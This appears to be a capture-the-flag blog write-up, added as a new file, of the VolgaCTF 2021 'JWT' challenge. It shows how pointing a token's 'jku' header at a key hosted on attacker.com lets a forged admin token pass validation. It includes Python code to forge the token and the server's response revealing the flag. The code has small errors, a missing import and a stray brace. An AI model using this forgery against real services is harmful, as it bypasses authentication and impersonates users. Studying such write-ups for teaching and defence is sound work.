@@ -1,0 +1,131 @@
+---
+layout: post
+title:  "JWT"
+tags: ctf
+author: f02a8dfe
+---
+JWT
+VolgaCTF Qualifier, 27th March 2021
+
+The author provided a simple site with registration and login functionality.
+
+Once logged in the site set a cookie:
+
+<pre class="highlight" style="word-break:break-word;white-space:inherit">
+Set-Cookie: token=eyJraWQiOiJIUzI1NiIsImFsZyI6IkhTMjU2In0.eyJqa3UiOiJodHRwOi8vbG9jYWxob3N0OjgwODAvc2VjcmV0IiwiZXhwIjoxNjE3NTQ2NTE4LCJqdGkiOiJFX3JzNEpZc2RGQ2hxSDM2dHJndUV3IiwiaWF0IjoxNjE2OTQxNzE4LCJuYmYiOjE2MTY5NDE1OTgsInN1YiI6ImFiY2QifQ.MdKqbbfQ7f2Y4tS0eJhH1bvuBVRyJj9HMCSdGL2aMOs;
+</pre>
+
+including the following header:
+
+```
+{
+  "kid": "HS256",
+  "alg": "HS256"
+}
+```
+
+and claims:
+
+```
+{
+  "jku": "http://localhost:8080/secret",
+  "exp": 1617459556,
+  "jti": "hQT90SFLRlhi_xSJlB2KWg",
+  "iat": 1616854756,
+  "nbf": 1616854636,
+  "sub": "username"
+}
+```
+
+The `jku` is "a URI that refers to a resource for a set of JSON-encoded public keys, one of which corresponds to the key used to digitally sign the JWS" [(RFC 7515)][rfc].
+
+A base 64 encoded octal JSON Web Key (JWK) for HS256 was generated with [jwcrypto][jwcrypto]:
+
+{% highlight python %}
+from jwcrypto import jwt
+
+# create key
+key = jwk.JWK(generate='oct', size=256)
+print(key.export())
+{% endhighlight %}
+
+and the following JSON, designed to match the token header, was hosted at `http://attacker.com/secret`:
+
+```
+{
+  "kty": "oct",
+  "kid": "HS256",
+  "alg": "HS256",
+  "k": "Ja0vLfBnpQ6_HTzVEn60eRklKHT2lE8zF0-8ZbqAGkk"
+}
+```
+
+By updating the claims `jku` and `sub` values:
+
+```
+{
+  "jku": "http://attacker.com/secret",
+  "exp": 1617459556,
+  "jti": "hQT90SFLRlhi_xSJlB2KWg",
+  "iat": 1616854756,
+  "nbf": 1616854636,
+  "sub": "admin"
+}
+```
+
+and signing a new token with the key from `http://attacker.com/secret`:
+
+{% highlight python %}
+from jwcrypto import jwt, jwk
+
+# import key
+k = {"k":"Ja0vLfBnpQ6_HTzVEn60eRklKHT2lE8zF0-8ZbqAGkk","kty":"oct"}
+key = jwk.JWK(**k)
+
+# content
+header = {"kid": "HS256","alg": "HS256"}
+claims = {"jku": "http://attacker.com/secret",
+          "exp": 1617459556,"jti": "hQT90SFLRlhi_xSJlB2KWg",
+          "iat": 1616854756,"nbf": 1616854636,"sub": "admin"}
+}
+          
+# create token
+token = jwt.JWT(header=header,claims=claims)
+token.make_signed_token(key)
+print(token.serialize())
+{% endhighlight %}
+
+When the token was submitted the web server retrieved the key from `http://attacker.com/secret`, validated the tampered token and returned the flag:
+
+{% highlight html %}
+<!DOCTYPE HTML>
+<html>
+<head>
+  <title>Main Page</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+  <link rel="stylesheet" type="text/css" href="css/style.css">
+</head>
+<body>
+<div class="login-box">
+  
+    <h2>Hello, admin</h2>
+    <div style="color: #03e9f4">
+      Flag is here VolgaCTF{jW5_jku_5u85T1TUt10n}
+    </div>
+    <div class="submit-button">
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+      <a href="/logout">Logout</a>
+    </div>
+  
+</div>
+</body>
+</html>
+{% endhighlight %}
+
+[rfc]: https://tools.ietf.org/html/rfc7515#page-10
+[jwcrypto]: https://jwcrypto.readthedocs.io/
+
+
